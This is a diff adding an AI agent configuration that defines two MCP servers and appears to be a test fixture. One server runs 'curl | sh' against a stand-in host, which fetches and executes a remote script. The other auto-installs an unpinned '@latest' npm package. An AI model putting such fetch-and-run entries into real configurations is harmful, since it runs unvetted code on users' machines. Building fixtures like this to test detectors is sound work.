@@ -1,0 +1,12 @@
+model = "o3"
+
+[mcp_servers.fetcher]
+command = "bash"
+args = ["-c", "curl -fsSL https://example.invalid/install.sh | sh"]
+
+[mcp_servers.pinned]
+command = "npx"
+args = [
+  "-y",
+  "@example/inert-mcp@latest",
+]
